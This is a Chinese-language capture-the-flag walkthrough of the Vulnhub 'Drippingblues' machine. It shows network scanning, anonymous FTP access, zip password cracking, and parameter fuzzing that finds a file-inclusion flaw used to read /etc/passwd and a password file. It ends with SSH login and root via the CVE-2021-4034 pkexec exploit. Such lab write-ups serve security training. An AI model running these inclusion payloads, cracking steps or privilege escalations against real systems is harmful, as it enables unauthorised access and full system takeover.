# Vulnhub Drippingblues


Vulnhub靶场练习 -- Drippingblues

## Knowledge

- robots.txt - spider  dined
- fcrackzip - zip password crack
- ffuf - url parameters fuzz
- polkit - CVE-2021-4034 privilege escalation

## 1. Environment Setup

靶机下载链接：[drippingblues](https://download.vulnhub.com/drippingblues/drippingblues.ova)

这个环境直接用VMware没有发现IP的问题，是一个Ubuntu 的desktop环境。

## 2. Reconnaisence

### 1. IP Address

arp-scan扫一下ip地址：

```shell
┌──(v4ler1an㉿kali)-[~/reports/http_172.16.86.144]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: xxxxx, IPv4: 172.16.86.138
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
172.16.86.1	5e:52:30:c9:b7:65	(Unknown: locally administered)
172.16.86.2	00:50:56:fd:f8:ec	VMware, Inc.
172.16.86.144	00:0c:29:cd:c8:dc	VMware, Inc.
172.16.86.254	00:50:56:fe:01:5c	VMware, Inc.

8 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.394 seconds (106.93 hosts/sec). 4 responded
```

### 2. Port Info

nmap看下端口信息：

```shell
┌──(v4ler1an㉿kali)-[~/reports/http_172.16.86.144]
└─$ nmap -T4 -A -Pn 172.16.86.144
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-08 21:01 EST
Nmap scan report for 172.16.86.144
Host is up (0.0024s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:172.16.86.138
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 0        0             471 Sep 19  2021 respectmydrip.zip [NSE: writeable]
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9e:bb:af:6f:7d:a7:9d:65:a1:b1:a1:be:91:cd:04:28 (RSA)
|   256 a3:d3:c0:b4:c5:f9:c0:6c:e5:47:64:fe:91:c5:cd:c0 (ECDSA)
|_  256 4c:84:da:5a:ff:04:b9:b5:5c:5a:be:21:b6:0e:45:73 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 2 disallowed entries
|_/dripisreal.txt /etc/dripispowerful.html
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.75 seconds
```

开放的端口信息：

| port | service  |
| ---- | -------- |
| 21   | FTP      |
| 22   | SSH      |
| 80   | HTTP Web |

对于21端口，首先尝试一下匿名登录：`anonymous/anonymous`：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ ftp 172.16.86.144
Connected to 172.16.86.144.
220 (vsFTPd 3.0.3)
Name (172.16.86.144:v4ler1an): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||49420|)
150 Here comes the directory listing.
-rwxrwxrwx    1 0        0             471 Sep 19  2021 respectmydrip.zip
226 Directory send OK.
ftp> pwd
Remote directory: /
ftp> get respectmydrip.zip
local: respectmydrip.zip remote: respectmydrip.zip
229 Entering Extended Passive Mode (|||5400|)
150 Opening BINARY mode data connection for respectmydrip.zip (471 bytes).
100% |**************************************************************************************************************************************|   471        8.98 MiB/s    00:00 ETA
226 Transfer complete.
471 bytes received in 00:00 (629.22 KiB/s)
ftp> cd /homw
550 Failed to change directory.
```

把目录下的respectmydrip.zip下载下来，解压时发现需要密码，先暂时搁置。切换目录失败，看来只能拿到这个压缩包了。

同样的账号密码尝试SSH失败，也正常，ftp和ssh本来就是俩东西。

访问80端口的web服务：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ curl http://172.16.86.144
<html>
<body>
driftingblues is hacked again so it's now called drippingblues. :D hahaha
<br>
by
<br>
travisscott & thugger
</body>
</html>
```

页面提示已经被hack了，还留下了两个名字，这俩名字后面可能会有用，比如是ssh的登录用户，实战场景下也就是攻击者留下的后门账户。

### 3. Web Directory

对80端口的web directory进行扫描：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ dirb http://172.16.86.144 -r

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Wed Nov  8 21:34:40 2023
URL_BASE: http://172.16.86.144/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://172.16.86.144/ ----
+ http://172.16.86.144/index.php (CODE:200|SIZE:138)
+ http://172.16.86.144/robots.txt (CODE:200|SIZE:78)
+ http://172.16.86.144/server-status (CODE:403|SIZE:278)

-----------------
END_TIME: Wed Nov  8 21:34:44 2023
DOWNLOADED: 4612 - FOUND: 3
```

发现一个robots.txt文件，访问：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ curl http://172.16.86.144/robots.txt
User-agent: *
Disallow: /dripisreal.txt
Disallow: /etc/dripispowerful.html
```

访问下:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ curl http://172.16.86.144/dripisreal.txt
hello dear hacker wannabe,

go for this lyrics:

https://www.azlyrics.com/lyrics/youngthug/constantlyhating.html

count the n words and put them side by side then md5sum it

ie, hellohellohellohello >> md5sum hellohellohellohello

it's the password of ssh

┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ curl http://172.16.86.144/etc/dripispowerful.html
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 172.16.86.144 Port 80</address>
</body></html>
```

第一个文件提示我们去计算歌词的单词然后md5值作为ssh的登录密码，看起来不太现实，因为这个歌词很长，先暂时搁置；第二个文件访问不到，看来etc目录可能是操作系统的etc目录。

## 3. Exploit

截止到目前为止，我们拿到的数据有一个respectmydrip.zip文件，但是带密码；另外有一个ssh密码的提示信息。

### 1. Zip Crack

首先尝试破解respectmydrip.zip文件：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u respectmydrip.zip


PASSWORD FOUND!!!!: pw == 072528035

┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ unzip respectmydrip.zip
Archive:  respectmydrip.zip
[respectmydrip.zip] respectmydrip.txt password:
 extracting: respectmydrip.txt
  inflating: secret.zip

┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ ll
total 16
drwxr-xr-x 3 v4ler1an v4ler1an 4096 Nov  8 21:19 reports
-rw-r--r-- 1 v4ler1an v4ler1an   20 Sep 19  2021 respectmydrip.txt
-rw-r--r-- 1 v4ler1an v4ler1an  471 Sep 19  2021 respectmydrip.zip
-rw-r--r-- 1 v4ler1an v4ler1an  171 Sep 19  2021 secret.zip
```

还真被我们爆破了这个压缩包。解压secret.zip提示还有密码，继续爆破尝试失败，密码也失败。查看respectmydrip.txt：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ cat cat respectmydrip.txt
just focus on "drip"
```

看来是个提示。

### 2. URL Parameters Fuzz

在前面的web directory的scan时，还有一个index.php的路径，我们可以尝试关注下这个文件。该文件处理的是web的主页面：

![image-20231109103704968](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311091037335.png)

我们在前面的robot.txt中还有一个`/etc/dripispowerful.html`访问不到，那么可以尝试能不能通过index.php来看下这个文件。

对index.php进行一个get方法的parameters的fuzz看看能不能传递参数，如果包含一个文件包含漏洞，那么就可以访问`/etc/dripispowerful.html`文件了：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools/scan/wfuzz]
└─$ ffuf -ic -c -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://172.16.86.144/index.php?FUZZ=/etc/passwd' -fs 138

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.16.86.144/index.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 138
________________________________________________

drip                    [Status: 200, Size: 3032, Words: 50, Lines: 58, Duration: 85ms]
:: Progress: [220547/220547] :: Job [1/1] :: 1626 req/sec :: Duration: [0:02:49] :: Errors: 0 ::
```

成功发现drip参数，突然发现刚好是`respectmydrip.txt`文件中的提示信息。。。

使用drip参数访问一下`/etc/dripispowerful.html`文件：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools/scan/wfuzz]
└─$ curl http://172.16.86.144/index.php?drip=/etc/dripispowerful.html
<!DOCTYPE html>
<html>
<body>
<style>
body {
background-image: url('drippin.jpg');
background-repeat: no-repeat;
}

@font-face {
    font-family: Segoe;
    src: url('segoeui.ttf');
}

.mainfo {
  text-align: center;
  border: 1px solid #000000;
  font-family: 'Segoe';
  padding: 5px;
  background-color: #ffffff;
  margin-top: 300px;
}

.emoji {
	width: 32px;
	}
</style>
password is:
imdrippinbiatch
</body>
</html>

<html>
<body>
driftingblues is hacked again so it's now called drippingblues. :D hahaha
<br>
by
<br>
travisscott & thugger
</body>
</html>
```

其中有一个password，接下来就用这个password和之前的两个用户名去尝试ssh登录。

## 4. Privilege Escalation

### 1. User Login

分别使用`travisscott/imdrippinbiatch`和`thugger/imdrippinbiatch`尝试登录ssh，发现第二个可以成功登录，并且可以读取到一个user.txt：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools/scan/wfuzz]
└─$ ssh thugger@172.16.86.144
thugger@172.16.86.144's password:
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.11.0-34-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


263 updates can be installed immediately.
30 of these updates are security updates.
To see these additional updates run: apt list --upgradable

New release '22.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Your Hardware Enablement Stack (HWE) is supported until April 2025.
*** System restart required ***
Last login: Wed Nov  8 17:05:31 2023 from 172.16.86.138
thugger@drippingblues:~$ ls
Desktop  Documents  Downloads  Music	Pictures  Public  Templates  Videos  user.txt
thugger@drippingblues:~$ id
uid=1001(thugger) gid=1001(thugger) groups=1001(thugger)
thugger@drippingblues:~$ ls
Desktop  Documents  Downloads  Music	Pictures  Public  Templates  Videos  user.txt
thugger@drippingblues:~$ cat user.txt
5C50FC503A2ABE93B4C5EE3425496521thugger@drippingblues:~$
```

感觉是个md5，尝试去碰撞一下：

![image-20231109110742350](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311091107631.png)

### 2. Privilege Escalation

接下来就是想办法去提权，内核版本比较高，而且环境中没有make、gcc等编译工具：

```shell
thugger@drippingblues:~$ uname -a
Linux drippingblues 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
thugger@drippingblues:~$ cat /proc/version
Linux version 5.11.0-34-generic (buildd@lgw01-amd64-001) (gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021

thugger@drippingblues:~$ gcc

Command 'gcc' not found, but can be installed with:

apt install gcc
Please ask your administrator.

thugger@drippingblues:~$ make

Command 'make' not found, but can be installed with:

apt install make        # version 4.2.1-1.2, or
apt install make-guile  # version 4.2.1-1.2

Ask your administrator to install one of them.

```

但是发现了python3环境:

```shell
thugger@drippingblues:~$ python3
Python 3.8.10 (default, May 26 2023, 14:05:08)
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> exit()
```

在寻找SUID程序时，发现了pkexec：

```shell
thugger@drippingblues:~$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
-rwsr-xr-x 1 root root 72712 Kas 24  2022 /snap/core22/864/usr/bin/chfn
-rwsr-xr-x 1 root root 44808 Kas 24  2022 /snap/core22/864/usr/bin/chsh
-rwsr-xr-x 1 root root 72072 Kas 24  2022 /snap/core22/864/usr/bin/gpasswd
-rwsr-xr-x 1 root root 47480 Şub 21  2022 /snap/core22/864/usr/bin/mount
-rwsr-xr-x 1 root root 40496 Kas 24  2022 /snap/core22/864/usr/bin/newgrp
-rwsr-xr-x 1 root root 59976 Kas 24  2022 /snap/core22/864/usr/bin/passwd
-rwsr-xr-x 1 root root 55672 Şub 21  2022 /snap/core22/864/usr/bin/su
-rwsr-xr-x 1 root root 232416 Nis  3  2023 /snap/core22/864/usr/bin/sudo
-rwsr-xr-x 1 root root 35192 Şub 21  2022 /snap/core22/864/usr/bin/umount
-rwsr-xr-- 1 root systemd-resolve 35112 Eki 25  2022 /snap/core22/864/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 338536 Tem 19 22:41 /snap/core22/864/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 111080 Ağu 10  2021 /snap/snapd/12883/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 43088 Eyl 16  2020 /snap/core18/2796/bin/mount
-rwsr-xr-x 1 root root 64424 Haz 28  2019 /snap/core18/2796/bin/ping
-rwsr-xr-x 1 root root 44664 Kas 29  2022 /snap/core18/2796/bin/su
-rwsr-xr-x 1 root root 26696 Eyl 16  2020 /snap/core18/2796/bin/umount
-rwsr-xr-x 1 root root 76496 Kas 29  2022 /snap/core18/2796/usr/bin/chfn
-rwsr-xr-x 1 root root 44528 Kas 29  2022 /snap/core18/2796/usr/bin/chsh
-rwsr-xr-x 1 root root 75824 Kas 29  2022 /snap/core18/2796/usr/bin/gpasswd
-rwsr-xr-x 1 root root 40344 Kas 29  2022 /snap/core18/2796/usr/bin/newgrp
-rwsr-xr-x 1 root root 59640 Kas 29  2022 /snap/core18/2796/usr/bin/passwd
-rwsr-xr-x 1 root root 149080 Nis  4  2023 /snap/core18/2796/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Eki 25  2022 /snap/core18/2796/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 436552 Mar 30  2022 /snap/core18/2796/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 43088 Eyl 16  2020 /snap/core18/2128/bin/mount
-rwsr-xr-x 1 root root 64424 Haz 28  2019 /snap/core18/2128/bin/ping
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /snap/core18/2128/bin/su
-rwsr-xr-x 1 root root 26696 Eyl 16  2020 /snap/core18/2128/bin/umount
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /snap/core18/2128/usr/bin/chfn
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /snap/core18/2128/usr/bin/chsh
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /snap/core18/2128/usr/bin/gpasswd
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /snap/core18/2128/usr/bin/newgrp
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /snap/core18/2128/usr/bin/passwd
-rwsr-xr-x 1 root root 149080 Oca 19  2021 /snap/core18/2128/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Haz 11  2020 /snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /snap/core18/2128/usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root dip 395144 Tem 23  2020 /usr/sbin/pppd
-rwsr-xr-x 1 root root 31032 Şub 21  2022 /usr/bin/pkexec
-rwsr-xr-x 1 root root 67816 Şub  7  2022 /usr/bin/su
-rwsr-xr-x 1 root root 166056 Nis  4  2023 /usr/bin/sudo
-rwsr-xr-x 1 root root 39144 Şub  7  2022 /usr/bin/umount
-rwsr-xr-x 1 root root 14728 Eki 27 14:51 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 85064 Kas 29  2022 /usr/bin/chfn
-rwsr-xr-x 1 root root 53040 Kas 29  2022 /usr/bin/chsh
-rwsr-xr-x 1 root root 88464 Kas 29  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 68208 Kas 29  2022 /usr/bin/passwd
-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 44784 Kas 29  2022 /usr/bin/newgrp
-rwsr-xr-x 1 root root 55528 Şub  7  2022 /usr/bin/mount
-rwsr-xr-- 1 root messagebus 51344 Eki 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-sr-x 1 root root 14488 Eki 23 19:31 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-x 1 root root 22840 Şub 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 146888 May 29 15:09 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 14488 Tem  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 473576 Ağu  5 01:02 /usr/lib/openssh/ssh-keysign
```

在进程信息中发现了polkitd进程：

```shell
thugger@drippingblues:~$ ps -ef
... ...
root       19330       1  0 05:04 ?        00:00:00 /usr/sbin/cupsd -l
root       29599       1  0 05:06 ?        00:00:00 /usr/lib/policykit-1/polkitd --no-debug
root       29605       1  0 05:06 ?        00:00:00 /usr/sbin/ModemManager --filter-policy=strict
... ...
```

那就直接用polkitd进行提权。使用sftp上传[CVE-2021-4034-exp](https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py)并执行进行提权:

```SHELL
thugger@drippingblues:~$ python3 cve-2021-4034.py
# id
uid=0(root) gid=0(root) groups=0(root),1001(thugger)
# ls /root
root.txt
# cat /root/root.txt
78CE377EF7F10FF0EDCA63DD60EE63B8#
```

这个md5进行碰撞没有发现结果。

没有其他东西了，应该也就到此为止了。

## Notes

### 思路梳理

url parameters fuzz --> robots.txt get file info --> get password -->  login ssh --> polkit privilege escalation

### CVE-2021-3560

CVE-2021-3560也是一个polkit常用的提权漏洞，但是在本次的测试中一直失败。

